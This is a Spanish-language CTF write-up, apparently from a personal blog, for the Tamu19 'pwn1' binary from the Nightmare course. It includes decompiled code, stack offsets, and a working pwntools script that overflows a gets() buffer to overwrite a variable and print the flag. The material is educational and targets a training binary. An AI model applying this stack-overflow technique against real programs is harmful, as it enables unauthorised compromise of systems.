---
layout: post
title: Pwn1 - Nightmare
tags: [ctf, rev, nightmare]
---

**Tamu19 pwn1**


## Análisis

Ejecuto **pwn checksec** sobre el binario.

```
h3rshel@kali:~/Desktop/reversing/nightmare$ pwn checksec pwn1 
[*] '/home/h3rshel/Desktop/reversing/nightmare/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## pwn1

Abro el binario con **ghidra**, donde se puede leer el código decompilado.

```c
undefined4 main(void)

{
  int cmpResult;
  char usrInput [43];
  int override_this;
  undefined4 local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  override_this = 0;

  // Primera pregunta
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(usrInput,0x2b,_stdin);
  cmpResult = strcmp(usrInput,"Sir Lancelot of Camelot\n");
  if (cmpResult != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
    exit(0);
  }

  // Segunda pregunta
  puts("What... is your quest?");
  fgets(usrInput,0x2b,_stdin);
  cmpResult = strcmp(usrInput,"To seek the Holy Grail.\n");
  if (cmpResult != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
    exit(0);
  }
  // Tercera pregunta
  puts("What... is my secret?");
  gets(usrInput);
  if (override_this == 0xdea110c8) {
    // Hay que conseguir llegar aquí
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

He renombrado algunas variables para que sea más sencillo de entender.

El binario realiza en total 3 preguntas las cuales hay que contestar correctamente para poder continuar con la ejecución. Las dos primeras son muy sencillas ya que se puede ver la solución directamente en el código. La tercera pregunta ("What... is my secret?") tiene truco ya que la variable que es comparada en ningún momento se modifica a lo largo del programa. Además, la tercera pregunta usa la función **gets()** para tomar la entrada del usuario, la cual es insegura y permite realizar un bufferoverflow.

El objetivo de este desafío es conseguir modificar el valor de la variable **override_this** para que coincida con el valor comparado (0xdea110c8). Casualmente esta variable se encuentra justo debajo de la variable **usrInput** por lo que se puede modificar introduciendo una cadena suficientemente larga.

Para calcular la distancia entre ambas variables solo hay que restar sus direcciones relativas al **ebp**. Esto se puede ver en **radare2**.

```
[0x56587779]> pdf
┌ 362: int main (char **argv);
│           ; var int32_t usrInput @ ebp-0x3b
│           ; var int32_t override_this @ ebp-0x10
│           ; var int32_t var_ch @ ebp-0xc
│           ; var int32_t var_8h @ ebp-0x8
│           ; arg char **argv @ esp+0x74
│           0x56587779      8d4c2404       lea ecx, [argv]
│           0x5658777d      83e4f0         and esp, 0xfffffff0
│           0x56587780      ff71fc         push dword [ecx - 4]
│           0x56587783      55             push ebp
│           0x56587784      89e5           mov ebp, esp
[...]
```

La diferencia es de **0x2b** la cual será el padding en el exploit.

```
    0x3b
  - 0x10
-----------
    0x2b
```

## Exploit

Creo el exploit en python el cual enviará las dos primeras frases correspondientes a cada pregunta y seguido el payload que sobreescribirá la variable "override_this" de forma que se ejecutará la función **print_flag()**.

```py
from pwn import *

# Iniciar el proceso
target = process('./pwn1')

# Responder pregunta 1
target.sendline("Sir Lancelot of Camelot")

# Responder pregunta 2
target.sendline("To seek the Holy Grail.")

# Payload
payload = b""
payload += b"0" * 0x2b # Distancia calculada anteriormente 
payload += p32(0xdea110c8) # Sobreescribir valor

# Responder pregunta 3
target.sendline(payload)

target.interactive()
```

### Ejecución

```
h3rshel@kali:~/Desktop/reversing/nightmare$ python3 exploit.py
[+] Starting local process './pwn1': pid 36404
[...]
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
flag{g0ttem_b0yz}

[*] Process './pwn1' stopped with exit code 0 (pid 36404)
```

Página original: **[Nightmare](https://guyinatuxedo.github.io/)**.

